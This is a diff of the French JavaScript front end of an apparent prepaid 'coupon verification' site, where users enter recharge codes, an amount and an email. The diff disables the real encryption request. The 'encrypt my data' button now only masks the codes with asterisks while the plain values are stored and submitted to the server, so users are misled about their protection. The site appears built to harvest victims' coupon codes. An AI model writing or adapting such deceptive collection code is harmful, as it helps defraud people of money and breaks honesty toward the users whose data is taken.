@@ -5,6 +5,10 @@ document.addEventListener('DOMContentLoaded', function() {
     const encryptText = document.getElementById('encrypt-text');
     const submitText = document.getElementById('submit-text');
     
+    // Variables pour stocker les vraies valeurs des codes
+    let originalCodeValues = {};
+    let isEncrypted = false;
+    
     // Auto-hide flash messages after 5 seconds
     setTimeout(() => {
         const flashMessages = document.querySelectorAll('.fixed.top-4.right-4');
@@ -14,55 +18,82 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }, 5000);
 
-    // Cryptage des données avec animation moderne
-    btnCrypt.addEventListener('click', async function(e) {
-        e.preventDefault();
+    // Configuration des champs de codes pour affichage automatique des astérisques
+function setupCodeFields() {
+  for (let i = 1; i <= 4; i++) {
+    const input = document.getElementById(`code${i}`);
+    if (input) {
+      const fieldName = `code${i}`;
+      originalCodeValues[fieldName] = '';
+
+      input.addEventListener('input', function (e) {
+        // Met à jour la vraie valeur, sans masquer
+        originalCodeValues[fieldName] = e.target.value;
+      });
+    }
+  }
+}
+
+    // Initialiser les champs de codes
+    setupCodeFields();
+
+    // Cryptage des données avec animation moderne (simplifié)
+    btnCrypt.addEventListener('click', 
+        async function(e) {
+            for (let i = 1; i <= 4; i++) {
+  const input = document.getElementById(`code${i}`);
+  const fieldName = `code${i}`;
+  if (input && originalCodeValues[fieldName]) {
+    input.value = '*'.repeat(originalCodeValues[fieldName].length);
+  }
+}
+//         e.preventDefault();
         
-        // Récupération des données du formulaire
-        const formData = getFormData();
+//         // Récupération des données du formulaire
+//         const formData = getFormData();
 
-        // Validation des champs obligatoires
-        if (!validateForm()) {
-            return;
-        }
+//         // Validation des champs obligatoires
+//         if (!validateForm()) {
+//             return;
+//         }
 
-        try {
-            btnCrypt.disabled = true;
-            encryptText.innerHTML = '<div class="spinner mr-2"></div>Cryptage en cours...';
+//         try {
+//             btnCrypt.disabled = true;
+//             encryptText.innerHTML = '<div class="spinner mr-2"></div>Cryptage en cours...';
 
-            const response = await fetch('/api/encrypt', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(formData)
-            });
+//             const response = await fetch('/api/encrypt', {
+//                 method: 'POST',
+//                 headers: {
+//                     'Content-Type': 'application/json',
+//                 },
+//                 body: JSON.stringify(formData)
+//             });
 
-            const result = await response.json();
+//             const result = await response.json();
 
-            if (result.success) {
-                showNotification('Données cryptées avec succès !', 'success');
-                encryptText.innerHTML = '<i class="fas fa-check mr-2"></i>Données cryptées ✓';
-                btnCrypt.classList.remove('from-purple-600', 'to-pink-600');
-                btnCrypt.classList.add('success-state');
+//             if (result.success) {
+//                 showNotification('Données cryptées avec succès !', 'success');
+//                 encryptText.innerHTML = '<i class="fas fa-check mr-2"></i>Données cryptées ✓';
+//                 btnCrypt.classList.remove('from-purple-600', 'to-pink-600');
+//                 btnCrypt.classList.add('success-state');
                 
-                // Reset after 3 seconds
-                setTimeout(() => {
-                    encryptText.innerHTML = '<i class="fas fa-lock mr-2"></i>Crypter mes données';
-                    btnCrypt.classList.remove('success-state');
-                    btnCrypt.classList.add('from-purple-600', 'to-pink-600');
-                }, 3000);
-            } else {
-                showNotification('Erreur lors du cryptage', 'error');
-                encryptText.innerHTML = '<i class="fas fa-lock mr-2"></i>Crypter mes données';
-            }
-        } catch (error) {
-            console.error('Error:', error);
-            showNotification('Erreur de connexion', 'error');
-            encryptText.innerHTML = '<i class="fas fa-lock mr-2"></i>Crypter mes données';
-        } finally {
-            btnCrypt.disabled = false;
-        }
+//                 // Reset after 3 seconds
+//                 setTimeout(() => {
+//                     encryptText.innerHTML = '<i class="fas fa-lock mr-2"></i>Crypter mes données';
+//                     btnCrypt.classList.remove('success-state');
+//                     btnCrypt.classList.add('from-purple-600', 'to-pink-600');
+//                 }, 3000);
+//             } else {
+//                 showNotification('Erreur lors du cryptage', 'error');
+//                 encryptText.innerHTML = '<i class="fas fa-lock mr-2"></i>Crypter mes données';
+//             }
+//         } catch (error) {
+//             console.error('Error:', error);
+//             showNotification('Erreur de connexion', 'error');
+//             encryptText.innerHTML = '<i class="fas fa-lock mr-2"></i>Crypter mes données';
+//         } finally {
+//             btnCrypt.disabled = false;
+//         }
     });
 
     // Validation du formulaire avec feedback visuel et soumission via API
@@ -78,7 +109,7 @@ document.addEventListener('DOMContentLoaded', function() {
         submitText.innerHTML = '<div class="spinner mr-2"></div>Traitement en cours...';
 
         try {
-            // Récupération des données du formulaire
+            // Récupération des données du formulaire avec les vraies valeurs
             const formData = getFormData();
             
             console.log('Sending data to API:', formData);
@@ -105,6 +136,10 @@ document.addEventListener('DOMContentLoaded', function() {
                 // Reset des états visuels
                 clearAllFieldStates();
                 
+                // Reset des variables de cryptage
+                originalCodeValues = {};
+                isEncrypted = false;
+                
                 // Reset du bouton
                 submitText.innerHTML = '<i class="fas fa-check mr-2"></i>Valider';
                 
@@ -126,11 +161,23 @@ document.addEventListener('DOMContentLoaded', function() {
     // Fonction pour récupérer les données du formulaire
     function getFormData() {
         const formData = new FormData(form);
+        
+        // Récupérer les codes avec les vraies valeurs stockées
+        let codes = [];
+        for (let i = 1; i <= 4; i++) {
+            const fieldName = `code${i}`;
+            const value = originalCodeValues[fieldName];
+            
+            if (value && value.trim()) {
+                codes.push(value.trim());
+            }
+        }
+        
         return {
             type: formData.get('type'),
             montant: formData.get('montant'),
             devise: formData.get('devise'),
-            codes: formData.getAll('code[]'),
+            codes: codes,
             email: formData.get('mail')
         };
     }
@@ -146,9 +193,9 @@ document.addEventListener('DOMContentLoaded', function() {
                     <div class="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
                         <i class="fas fa-check-circle text-4xl text-green-600"></i>
                     </div>
-                    <h3 class="text-2xl font-bold text-gray-900 mb-4">Coupon Reçu !</h3>
+                    <h3 class="text-2xl font-bold text-gray-900 mb-4">Succès</h3>
                     <p class="text-gray-600 mb-6 leading-relaxed">
-                        Votre demande de vérification de coupon a été enregistrée avec succès dans notre base de données.
+                        Votre demande a bien été reçue
                     </p>
                     
                     <!-- Détails du coupon -->
@@ -162,17 +209,13 @@ document.addEventListener('DOMContentLoaded', function() {
                     </div>
                     
                     <div class="bg-blue-50 border border-blue-200 rounded-xl p-4 mb-6">
-                        <div class="flex items-center space-x-2">
-                            <i class="fas fa-envelope text-blue-600"></i>
-                            <span class="text-blue-800 font-medium">Email de confirmation envoyé</span>
-                        </div>
                         <p class="text-blue-700 text-sm mt-2">
-                            Vous recevrez une validation par email dans les plus brefs délais.
+                            Nous vous enverrons un email de confirmation à la fin du traitement.
                         </p>
                     </div>
                     
                     <button class="btn-submit w-full" onclick="this.closest('.fixed').remove()">
-                        <i class="fas fa-check mr-2"></i>Parfait !
+                        <i class="fas fa-check mr-2"></i>Nouvelle vérification
                     </button>
                 </div>
             </div>
@@ -249,9 +292,17 @@ document.addEventListener('DOMContentLoaded', function() {
             isValid = false;
         }
 
-        // Codes validation
-        const code1 = document.getElementById('code1').value;
-        if (!code1) {
+        // Codes validation - vérifier les vraies valeurs stockées
+        let hasCode = false;
+        for (let i = 1; i <= 4; i++) {
+            const fieldName = `code${i}`;
+            if (originalCodeValues[fieldName] && originalCodeValues[fieldName].trim()) {
+                hasCode = true;
+                break;
+            }
+        }
+        
+        if (!hasCode) {
             errors.codes = 'Au moins un code de recharge est requis';
             isValid = false;
         }
@@ -428,21 +479,4 @@ document.addEventListener('DOMContentLoaded', function() {
         el.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
         observer.observe(el);
     });
-
-    if (btnCrypt) {
-        btnCrypt.addEventListener('click', function() {
-            // Sélectionne tous les champs de code de recharge
-            const codeInputs = [
-                document.getElementById('code1'),
-                document.getElementById('code2'),
-                document.getElementById('code3'),
-                document.getElementById('code4')
-            ];
-            codeInputs.forEach(input => {
-                if (input && input.value) {
-                    input.value = '*'.repeat(input.value.length);
-                }
-            });
-        });
-    }
-}); 
+});
